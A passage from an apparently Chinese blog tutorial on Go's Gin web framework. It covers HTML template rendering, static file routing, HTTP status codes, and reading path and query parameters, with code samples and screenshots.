*gin.Context)</span></span> &#123;<br>context.HTML(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;dome1/hello1.html&quot;</span>, <span class="hljs-literal">nil</span>)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">hello2</span><span class="hljs-params">(context *gin.Context)</span></span> &#123;<br>context.HTML(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;dome2/hello2.html&quot;</span>, <span class="hljs-literal">nil</span>)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>r := gin.Default()<br>r.LoadHTMLGlob(<span class="hljs-string">&quot;templates/**/*&quot;</span>)<br>r.GET(<span class="hljs-string">&quot;/hello1&quot;</span>, hello1)<br>r.GET(<span class="hljs-string">&quot;/hello2&quot;</span>, hello2)<br>r.Run()<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051400439.png" alt="image-20230401213107590"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051400441.png" alt="image-20230401213122019"></p><h3 id="静态文件"><a href="#静态文件" class="headerlink" title="静态文件"></a>静态文件</h3><p>静态文件：CSS，JS，图片…</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051400444.png" alt="image-20230401214559997"></p><p>如何使用？</p><ol><li>先指定静态文件路径（ 设置对应目录 ）</li><li>在前端页面引入静态文件</li></ol><h4 id="指定静态文件路径"><a href="#指定静态文件路径" class="headerlink" title="指定静态文件路径"></a>指定静态文件路径</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">r.Static(<span class="hljs-string">&quot;/s&quot;</span>, <span class="hljs-string">&quot;static&quot;</span>)<span class="hljs-comment">// 将static这个文件夹映射到s上</span><br></code></pre></td></tr></table></figure><ul><li>第一个参数：相对路径</li><li>第二个参数：文件夹名称</li><li>含义：这个相对路径映射到哪个文件夹上去</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">r.StaticFS(<span class="hljs-string">&quot;/s&quot;</span>, http.Dir(<span class="hljs-string">&quot;static&quot;</span>))<br></code></pre></td></tr></table></figure><h4 id="引入静态文件"><a href="#引入静态文件" class="headerlink" title="引入静态文件"></a>引入静态文件</h4><p>css 文件位置：static&#x2F;css&#x2F;mycss.css</p><p>上面设置了<code>/s</code>表示<code>static</code>，所以这里是<code>/s/css/mycss.css</code></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051400445.png" alt="image-20230401215618823"></p><h2 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h2><p>一个项目：</p><p>静态文件：static 目录</p><p>模版文件：templates 目录</p><p>函数：myfunc 目录 </p><p>路由数据交互函数：datainteraction.go </p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051406989.png" alt="image-20230401220434543"></p><h2 id="数据渲染"><a href="#数据渲染" class="headerlink" title="数据渲染"></a>数据渲染</h2><p>后端的数据渲染到前端页面：</p><ol><li>context.HTML 第三个参数传入字符串</li><li>HTML文件中使用上下文接收</li></ol><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Hello</span><span class="hljs-params">(context *gin.Context)</span></span> &#123;<br>name := <span class="hljs-string">&quot;fuming&quot;</span><br>context.HTML(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;dome1/hello.html&quot;</span>, name)<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>My name is &#123;&#123;.&#125;&#125; !<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051400472.png" alt="image-20230403093324917"></p><h3 id="单个结构体"><a href="#单个结构体" class="headerlink" title="单个结构体"></a>单个结构体</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Hello</span><span class="hljs-params">(context *gin.Context)</span></span> &#123;<br>f := &amp;Student&#123;<br>Name: <span class="hljs-string">&quot;fuming&quot;</span>,<br>Age:  <span class="hljs-string">&quot;20&quot;</span>,<br>&#125;<br>context.HTML(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;dome1/hello.html&quot;</span>, f)<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>My name is &#123;&#123;.Name&#125;&#125; .<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>My age is &#123;&#123;.Age&#125;&#125; .<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>This struct is &#123;&#123;.&#125;&#125; .<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051400410.png" alt="image-20230403093853053"></p><p>传入多个结构体可以借助<code>Map</code>来完成。</p><h3 id="数组切片"><a href="#数组切片" class="headerlink" title="数组切片"></a>数组切片</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Hello</span><span class="hljs-params">(context *gin.Context)</span></span> &#123;<br>numbers := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;<br>context.HTML(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;dome1/hello.html&quot;</span>, numbers)<br>&#125;<br></code></pre></td></tr></table></figure><p>整个：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>&#123;&#123;.&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051400075.png" alt="image-20230403115941206"></p><p>值遍历：<code>&#123;&#123;.&#125;&#125;</code> 代表遍历的值</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br>    &#123;&#123;range .&#125;&#125;<br>    &#123;&#123;.&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br>&#123;&#123;end&#125;&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051400237.png" alt="image-20230403120101549"></p><p>值遍历：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br>    &#123;&#123;range $v := .&#125;&#125;<br>    值: &#123;&#123;$v&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br>&#123;&#123;end&#125;&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051400958.png" alt="image-20230403120248434"></p><p>键值遍历：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br>    &#123;&#123;range $i,$v := .&#125;&#125;<br>    索引: &#123;&#123;$i&#125;&#125;  值: &#123;&#123;$v&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br>&#123;&#123;end&#125;&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051400871.png" alt="image-20230403120138955"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051400880.png" alt="image-20230403120349693"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051400449.png" alt="image-20230403120409422"></p><h3 id="结构体数组"><a href="#结构体数组" class="headerlink" title="结构体数组"></a>结构体数组</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Hello</span><span class="hljs-params">(context *gin.Context)</span></span> &#123;<br>s := []Student&#123;<br>&#123;<br>Name: <span class="hljs-string">&quot;fuming&quot;</span>,<br>Age:  <span class="hljs-string">&quot;20&quot;</span>,<br>&#125;,<br>&#123;<br>Name: <span class="hljs-string">&quot;xiaowang&quot;</span>,<br>Age:  <span class="hljs-string">&quot;21&quot;</span>,<br>&#125;,<br>&#123;<br>Name: <span class="hljs-string">&quot;xiaocai&quot;</span>,<br>Age:  <span class="hljs-string">&quot;18&quot;</span>,<br>&#125;,<br>&#125;<br>context.HTML(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;dome1/hello.html&quot;</span>, s)<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051400599.png" alt="image-20230403124308893"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051406070.png" alt="image-20230403124318535"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br>        &#123;&#123;range .&#125;&#125;<br>            Name = &#123;&#123;.Name&#125;&#125;<br>            Age = &#123;&#123;.Age&#125;&#125;<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br>        &#123;&#123;end&#125;&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br>        &#123;&#123;range $v := .&#125;&#125;<br>            Name = &#123;&#123;$v.Name&#125;&#125;<br>            Age = &#123;&#123;$v.Age&#125;&#125;<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br>        &#123;&#123;end&#125;&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br>        &#123;&#123;range $i,$v := .&#125;&#125;<br>            key = &#123;&#123;$i&#125;&#125;<br>            Name = &#123;&#123;$v.Name&#125;&#125;<br>            Age = &#123;&#123;$v.Age&#125;&#125;<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br>        &#123;&#123;end&#125;&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051400911.png" alt="image-20230403125020132"></p><h3 id="映射"><a href="#映射" class="headerlink" title="映射"></a>映射</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Hello</span><span class="hljs-params">(context *gin.Context)</span></span> &#123;<br>age := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>)<br>age[<span class="hljs-string">&quot;fuming&quot;</span>] = <span class="hljs-number">18</span><br>age[<span class="hljs-string">&quot;xiaoli&quot;</span>] = <span class="hljs-number">20</span><br>context.HTML(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;dome1/hello.html&quot;</span>, age)<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br>        fuming = &#123;&#123;.fuming&#125;&#125;<br>        xiaoli = &#123;&#123;.xiaoli&#125;&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051401154.png" alt="image-20230403125504803"></p><h3 id="多个结构体"><a href="#多个结构体" class="headerlink" title="多个结构体"></a>多个结构体</h3><p>多个结构体的渲染通过 map 来实现：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Hello</span><span class="hljs-params">(context *gin.Context)</span></span> &#123;<br>info := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]Student)<br>info[<span class="hljs-string">&quot;fuming&quot;</span>] = Student&#123;<br>Age: <span class="hljs-number">18</span>,<br>Sex: <span class="hljs-string">&quot;男&quot;</span>,<br>&#125;<br>info[<span class="hljs-string">&quot;xiaocai&quot;</span>] = Student&#123;<br>Age: <span class="hljs-number">22</span>,<br>Sex: <span class="hljs-string">&quot;女&quot;</span>,<br>&#125;<br>context.HTML(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;dome1/hello.html&quot;</span>, info)<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>&#123;&#123;.&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>&#123;&#123;.fuming&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>&#123;&#123;.xiaocai&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051401828.png" alt="image-20230403130554675"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>&#123;&#123;.fuming.Sex&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>&#123;&#123;.xiaocai.Sex&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051401381.png" alt="image-20230403130644051"></p><h2 id="HTTP请求与响应"><a href="#HTTP请求与响应" class="headerlink" title="HTTP请求与响应"></a>HTTP请求与响应</h2><p><a href="https://www.runoob.com/http/http-tutorial.html">https://www.runoob.com/http/http-tutorial.html</a></p><h3 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h3><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051401145.png" alt="img"></p><h3 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h3><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051401198.jpg" alt="img"></p><p>状态码：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051406755.png" alt="image-20230403152059347"></p><p>常见状态码：</p><ul><li><p>200 - 请求成功，已经正常处理完毕</p></li><li><p>301 - 请求永久重定向，转移到其它URL</p></li><li><p>302 - 请求临时重定向</p></li><li><p>304 - 请求被重定向到客户端本地缓存</p></li><li><p>400 - 客户端请求存在语法错误</p></li><li><p>401 - 客户端请求没有经过授权</p></li><li><p>403 - 客户端的请求被服务器拒绝，一般为客户端没有访问权限</p></li><li><p>404 - 资源未找到，客户端请求的URL在服务端不存在</p></li><li><p>500 - 服务端出现异常</p></li></ul><p>MIME类型：</p><p><a href="https://www.runoob.com/http/mime-types.html">https://www.runoob.com/http/mime-types.html</a></p><p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的标准，用来表示文档、文件或字节流的性质和格式。</p><p>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。</p><p>浏览器通常使用 MIME 类型（而不是文件扩展名）来确定如何处理URL，因此 Web服务器在响应头中添加正确的 MIME 类型非常重要。如果配置不正确，浏览器可能会无法解析文件内容，网站将无法正常工作，并且下载的文件也会被错误处理。</p><p>在服务端我们可以设置响应头中Content-Type的值来指定响应类型。</p><h2 id="数据交互"><a href="#数据交互" class="headerlink" title="数据交互"></a>数据交互</h2><p>前端的数据给后端</p><h3 id="路径中拼参数值"><a href="#路径中拼参数值" class="headerlink" title="路径中拼参数值"></a>路径中拼参数值</h3><p>路径中参数值：<a href="http://43.139.185.135:8080/hello/%E5%8F%82%E6%95%B0">http://43.139.185.135:8080/hello/参数</a></p><p>在路由设置的路径那里加占位符，再通过<code>context.Param()</code>获取参数值。</p><p>占位符：</p><ul><li><code>:</code> &#x3D;&gt; 必须存在参数，否则404</li><li><code>*</code> &#x3D;&gt; 可以不存在参数，但是参数前会多个<code>/</code></li></ul><p><code>:</code> 占位符：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>r := gin.Default()<br>r.LoadHTMLGlob(<span class="hljs-string">&quot;templates/**/*&quot;</span>)<br>r.StaticFS(<span class="hljs-string">&quot;/s&quot;</span>, http.Dir(<span class="hljs-string">&quot;static&quot;</span>))<br>    r.GET(<span class="hljs-string">&quot;/hello/:name&quot;</span>, myfunc.Hello)<span class="hljs-comment">// 路由后跟name(参数)</span><br>r.Run()<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Hello</span><span class="hljs-params">(context *gin.Context)</span></span> &#123;<br>    <span class="hljs-comment">// 获取参数值</span><br>name := context.Param(<span class="hljs-string">&quot;name&quot;</span>)<br>    <span class="hljs-comment">// 渲染给HTML页面</span><br>context.HTML(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;hello/hello.html&quot;</span>, name)<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051401285.png" alt="image-20230403154908049"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051401668.png" alt="image-20230403154757392"></p><p><code>*</code> 占位符：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">r.GET(<span class="hljs-string">&quot;/hello/*name&quot;</span>, myfunc.Hello)<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051401756.png" alt="image-20230403155014255"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051401645.png" alt="image-20230403155104751"></p><h3 id="路径后键值对"><a href="#路径后键值对" class="headerlink" title="路径后键值对"></a>路径后键值对</h3><p>路径后键值对：<a href="http://43.139.185.135:8080/hello?id=1&name=fuming">http://43.139.185.135:8080/hello?id=1&amp;name=fuming</a></p><p>利用 ? 的形式拼接参数的键值对，多个键值对中间用 &amp; 符号进行拼接</p><p>不需要对路由操作，直接通过<code>context.Query()</code>&#x2F;<code>context.DefaultQuery()</code>获取参数即可。</p><p><code>context.Query()</code> 获取请求参数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Context)</span></span> Query(key <span class="hljs-type">string</span>) (value <span class="hljs-type">string</span>)<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Hello</span><span class="hljs-params">(context *gin.Context)</span></span> &#123;<br>name := context.Query(<span class="hljs-string">&quot;name&quot;</span>)<br>age := context.Query(<span class="hljs-string">&quot;age&quot;</span>)<br>context.String(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;name = %s \t age = %s&quot;</span>, name, age)<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051401860.png" alt="image-20230403160307817" style="zoom:67%;" /><p><code>context.DefaultQuery()</code>：获取请求参数并设置默认值，没有参数时则使用默认值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Context)</span></span> DefaultQuery(key <span class="hljs-type">string</span>, defaultValue <span class="hljs-type">string</span>) <span class="hljs-type">string</span><br></code></pre></td></tr></table></figure><p><a href="http://43.139.185.135:8080/hello">http://43.139.185.135:8080/hello</a></p><img src="D:\my-documents\笔记\golang-notes\WEB开发\Gin框架\Gin.assets\image-20230403160516625.png" alt="image-20230403160516625" style="zoom:67%;" /><p><a href="http://43.139.185.135:8080/hello?name=admin&age=20">http://43.139.185.135:8080/hello?name=admin&amp;age=20</a></p><img src="D:\my-documents\笔记\golang-notes\WEB开发\Gin框架\Gin.assets\image-20230403160538967.png" alt="image-20230403160538967" style="zoom:67%;" /><h3 id="多个参数值"><a href="#多个参数值" class="headerlink" title="多个参数值"></a>多个参数值</h3><p>数组接收：<a href="http://43.139.185.135:8080/hello?name=admin&name=fuming&name=root">http://43.139.185.135:8080/hello?name=admin&amp;name=fuming&amp;name=root</a></p><p>Map接收：<a href="http://43.139.185.135:8080/hello?name%5B1%5D=admin&name%5B2%5D=fuming&name%5B3%5D=root">http://43.139.185.135:8080/hello?name[1]=admin&amp;name[2]=fuming&amp;name[3]=root</a></p><p>数组：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Context)</span></span> QueryArray(key <span class="hljs-type">string</span>) (values []<span class="hljs-type">string</span>)<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Hello</span><span class="hljs-params">(context *gin.Context)</span></span> &#123;<br>names := context.QueryArray(<span class="hljs-string">&quot;name&quot;</span>)<br>context.String(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;names[1] = %s\nnames[2] = %s\nnames = %v&quot;</span>, names[<span class="hljs-number">1</span>], names[<span class="hljs-number">2</span>], names)<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051402450.png" alt="image-20230403161345659" style="zoom:67%;" /><p>Map：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Context)</span></span> QueryMap(key <span class="hljs-type">string</span>) (dicts <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>)<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Hello</span><span class="hljs-params">(context *gin.Context)</span></span> &#123;<br>names := context.QueryMap(<span class="hljs-string">&quot;name&quot;</span>)<br>context.String(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;name = %v\tnames[1] = %s&quot;</span>, names, names[<span class="hljs-string">&quot;1&quot;</span>])<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051402679.png" alt="image-20230403161709603"></p><h3 id="获取POST数据-PostForm"><a href="#获取POST数据-PostForm" class="headerlink" title="获取POST数据-PostForm"></a>获取POST数据-PostForm</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span 